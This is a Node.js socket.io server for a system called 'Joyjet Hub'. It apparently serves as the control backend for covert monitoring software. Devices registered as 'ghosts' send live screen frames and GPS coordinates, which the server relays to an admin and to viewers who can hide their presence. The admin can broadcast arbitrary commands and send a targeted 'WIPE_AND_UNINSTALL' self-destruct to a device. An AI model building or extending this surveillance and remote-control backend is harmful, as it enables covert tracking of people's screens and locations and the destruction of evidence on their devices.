const express = require('express');
const http = require('http');
const { Server } = require('socket.io');
const axios = require('axios');

const app = express();
const server = http.createServer(app);

// 1. HIGH-CAPACITY SOCKET CONFIG (100MB Buffer for Screen Stream)
const io = new Server(server, {
  maxHttpBufferSize: 1e8, 
  pingTimeout: 60000,
  cors: { origin: "*" }
});

// 2. RENDER KEEP-ALIVE & HEARTBEAT
const PUBLIC_URL = "https://joyjet-server.onrender.com";
let lastActiveTime = Date.now();

setInterval(async () => {
  try {
    await axios.get(PUBLIC_URL);
    console.log('Keep-Alive: Heartbeat successful.');
  } catch (err) {
    console.log('Keep-Alive: Pulse sent.');
  }
}, 600000); // 10 Minutes

// 3. GLOBAL STATE TRACKER
let activeAdmin = null;
let viewers = new Map(); // Map of socketId -> { name, hidden: false }
let ghosts = new Map();  // Map of socketId -> { name }

io.on('connection', (socket) => {
  console.log('Node Linked:', socket.id);

  // --- ROLE ASSIGNMENT ---
  
  // ADMIN LOGIN (Full Access)
  socket.on('claim_admin', (data) => {
    activeAdmin = socket.id;
    socket.emit('role_assigned', { role: 'ADMIN', name: data.name });
    
    // Check if server was asleep (more than 15 mins inactivity)
    if (Date.now() - lastActiveTime > 900000) {
        socket.emit('system_alert', { msg: "Server waking up from standby. Ghosts reconnecting..." });
    }
    console.log(`Admin [${data.name}] in control.`);
  });

  // VIEWER LOGIN (Limited to 3 Ghosts)
  socket.on('claim_viewer', (data) => {
    viewers.set(socket.id, { name: data.name, hidden: false });
    socket.emit('role_assigned', { role: 'VIEWER', name: data.name, ghostLimit: 3 });
    console.log(`Viewer [${data.name}] joined.`);
  });

  // GHOST REGISTRATION
  socket.on('register_user', (data) => {
    ghosts.set(socket.id, { name: data.name });
    lastActiveTime = Date.now(); // Reset sleep timer
    
    // Alert Admin/Viewers that a Ghost just woke the server
    io.emit('system_alert', { msg: `Ghost Node [${data.name}] active.` });
    socket.emit('role_assigned', { role: 'GHOST', name: data.name });
  });

  // --- STATUS & STEALTH ---

  socket.on('toggle_visibility', (data) => {
    if (viewers.has(socket.id)) {
        let vData = viewers.get(socket.id);
        vData.hidden = data.hidden;
        viewers.set(socket.id, vData);
        console.log(`Viewer [${vData.name}] status: ${data.hidden ? 'OFFLINE' : 'ONLINE'}`);
    }
  });

  // --- DATA RELAYS & COMMANDS ---

  // Screen Stream Relay
  socket.on('screen_frame', (frame) => {
    // Admin always gets it
    if (activeAdmin) io.to(activeAdmin).emit('screen_frame', frame);
    
    // Viewers get it (Logic to limit to 3 is handled on the Viewer Dashboard)
    viewers.forEach((val, id) => {
        if (!val.hidden) io.to(id).emit('screen_frame', frame);
    });
  });

  // GPS Relay
  socket.on('ghost_location_data', (coords) => {
    if (activeAdmin) io.to(activeAdmin).emit('ghost_update', { type: 'GPS', data: coords });
    viewers.forEach((val, id) => {
        if (!val.hidden) io.to(id).emit('ghost_update', { type: 'GPS', data: coords });
    });
  });

  // WIPE COMMAND (Targeted Self-Destruct)
  socket.on('admin_wipe', (targetGhostId) => {
    if (socket.id === activeAdmin) {
        io.to(targetGhostId).emit('admin_command', 'WIPE_AND_UNINSTALL');
        console.log(`!!! WIPE ISSUED FOR [${targetGhostId}] !!!`);
    }
  });

  // Global Admin Command
  socket.on('admin_command', (cmd) => {
    if (socket.id === activeAdmin) {
        socket.broadcast.emit('admin_command', cmd);
        console.log('Global Command Sent:', cmd);
    }
  });

  // --- DISCONNECT ---
  socket.on('disconnect', () => {
    if (socket.id === activeAdmin) activeAdmin = null;
    viewers.delete(socket.id);
    ghosts.delete(socket.id);
    console.log('Node Unlinked:', socket.id);
  });
});

app.get('/', (req, res) => res.send('Joyjet Hub: Operational'));

const PORT = process.env.PORT || 3000;
server.listen(PORT, () => console.log(`Server running on port ${PORT}`));
